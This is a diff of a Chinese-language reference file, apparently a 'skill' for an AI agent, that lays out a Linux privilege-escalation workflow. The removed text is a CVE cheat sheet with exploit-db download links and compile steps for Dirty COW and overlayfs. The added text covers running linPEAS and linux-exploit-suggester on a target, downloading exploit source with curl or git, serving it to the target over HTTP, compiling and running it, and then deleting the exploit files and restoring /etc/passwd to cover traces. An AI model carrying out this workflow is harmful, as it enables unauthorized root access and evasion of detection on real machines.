@@ -1,72 +1,109 @@
-# Linux 提权 CVE 速查
+# Exploit 动态匹配参考
 
-## Kernel 3.x 常用提权
+本 skill 不预设任何固定 CVE/exploit，所有漏洞匹配在探测目标后动态完成。本文档说明如何解读探测结果并获取对应 exploit。
 
-| CVE | 名称 | 内核范围 | 影响系统 | 下载 | 难度 |
-|-----|------|----------|----------|------|------|
-| CVE-2016-5195 | Dirty COW | 2.6.22 - 4.8.3 | 通用 Linux | [40839](https://www.exploit-db.com/raw/40839) | ⭐⭐⭐⭐⭐ |
-| CVE-2015-1328 | overlayfs | 3.13.0 - 3.19.0 | Ubuntu 12.04/14.04 | [37292](https://www.exploit-db.com/raw/37292) | ⭐⭐⭐⭐⭐ |
-| CVE-2015-8660 | overlayfs2 | 3.0.0 - 4.3.3 | Ubuntu | [39230](https://www.exploit-db.com/raw/39230) | ⭐⭐⭐⭐ |
-| CVE-2014-0038 | timeoutpwn | 3.4.0 - 3.13.1 | Ubuntu 13.10 | [31346](https://www.exploit-db.com/raw/31346) | ⭐⭐⭐ |
-| CVE-2014-0196 | rawmodePTY | 2.6.31 - 3.14.3 | 通用 Linux | [33516](https://www.exploit-db.com/raw/33516) | ⭐⭐⭐ |
-| CVE-2018-14665 | Xorg | 多个 | 通用 Linux | [45697](https://www.exploit-db.com/raw/45697) | ⭐⭐⭐ |
+## 探测工具
 
-## 速查命令
+| 工具 | 说明 | 用法 |
+|------|------|------|
+| **linPEAS** | 全面系统枚举 + 内置 CVE 匹配 | `./linpeas.sh` |
+| **LES (linux-exploit-suggester)** | 内核漏洞快速匹配 | `./les.sh` 或 `perl les2.pl` |
 
-```bash
-# 目标机内核版本
-uname -a
+## 解析探测结果
 
-# 目标机发行版
-cat /etc/os-release 2>/dev/null || cat /etc/*release
+### linPEAS 输出中的 CVE
 
-# 查找所有 SUID 文件
-find / -perm -4000 -type f 2>/dev/null
+linPEAS 内置了内核漏洞匹配引擎，输出中会有类似内容：
 
-# 检查 sudo 权限（需要密码时可能失败）
-sudo -l
-
-# 检查可写脚本/目录
-find / -writable -type f 2>/dev/null | head -50
-
-# 检查 cron
-ls -la /etc/cron*
-
-# 检查 MySQL root 空密码
-mysql -u root -e 'select User,Host from mysql.user;' 2>/dev/null
+```
+╔══════════╣ Kernel Exploit Registry (T1068)
+═╣ Kernel release ............... 3.13.0-32-generic
+CVE: CVE-2015-1328 | Name: overlayfs | ...
+CVE: CVE-2016-5195 | Name: dirtycow | ...
 ```
 
-## 各 exploit 编译方法
-
-### Dirty COW (CVE-2016-5195)
+用以下命令提取：
 ```bash
-gcc -pthread dirtycow.c -o dirtycow -lcrypt
-./dirtycow newpass
-su firefart
-# 默认创建用户 firefart，密码为参数
-# 会备份 /etc/passwd 到 /tmp/passwd.bak
+grep -iE 'CVE-[0-9]{4}' /tmp/target_peas.txt | sort -u
 ```
 
-### overlayfs (CVE-2015-1328)
-```bash
-gcc ofs.c -o ofs
-./ofs
-# 成功后当前 shell 变为 root (#)
+### exploit-suggester 输出
+
+LES 输出格式：
+
+```
+[+] [CVE-2015-1328] overlayfs
+   Details: http://www.exploit-db.com/exploits/37292
+   Kernel: 3.13.0 - 3.19.0
+
+[+] [CVE-2016-5195] dirtycow
+   Details: http://www.exploit-db.com/exploits/40616
+   Kernel: 2.6.22 - 4.8.3
 ```
 
-### timeoutpwn (CVE-2014-0038)
+## 下载 Exploit
+
+### 从 exploit-db
+
 ```bash
-gcc timeoutpwn.c -o timeoutpwn
-./timeoutpwn
-# 需 CONFIG_X86_X32=y
+# exploit-db ID (从 suggetser 输出中获取)
+ID=37292
+
+# 下载到本机 HTTP 目录
+curl -sL -o /tmp/poc.c "https://www.exploit-db.com/raw/$ID"
+
+# 上传到目标机
+# 通过 HTTP 服务: http://<本机IP>:8888/poc.c
 ```
 
-## 提权成功后清理
+### 从 GitHub
+
+部分 exploit 在 GitHub 上有更新版本：
 
 ```bash
-# 恢复 /etc/passwd（Dirty COW 后）
+# 搜索公开 PoC
+git clone https://github.com/<user>/<repo>.git
+
+# 或通过 searchsploit（如果 kali 已安装）
+searchsploit -m <exploit-path>
+```
+
+## 编译 Exploit
+
+```bash
+# 标准 C
+gcc exploit.c -o exploit
+./exploit
+
+# 需要 pthread + crypt（如 Dirty COW）
+gcc -pthread exploit.c -o exploit -lcrypt
+./exploit
+
+# 需要静态编译
+gcc -static exploit.c -o exploit
+./exploit
+
+# Python exploit
+python exploit.py
+
+# Perl exploit
+perl exploit.pl
+```
+
+## 提权后清理
+
+```bash
+# 恢复被修改的系统文件
+# 如果 Dirty COW 改过 /etc/passwd:
 cp /tmp/passwd.bak /etc/passwd
 
 # 清理临时文件
-rm -f /tmp/ofs /tmp/ofs.c /tmp/dirty /tmp/dirty.c /tmp/linpeas.sh
+rm -f /tmp/linpeas.sh /tmp/les.sh /tmp/exploit* /tmp/poc* /tmp/peas-out.txt
 ```
+
+## 参考链接
+
+- https://www.exploit-db.com — 搜索 exploit
+- https://nvd.nist.gov — CVE 详情
+- https://github.com/peass-ng/PEASS-ng — linPEAS
+- https://github.com/mzet-/linux-exploit-suggester — exploit-suggester
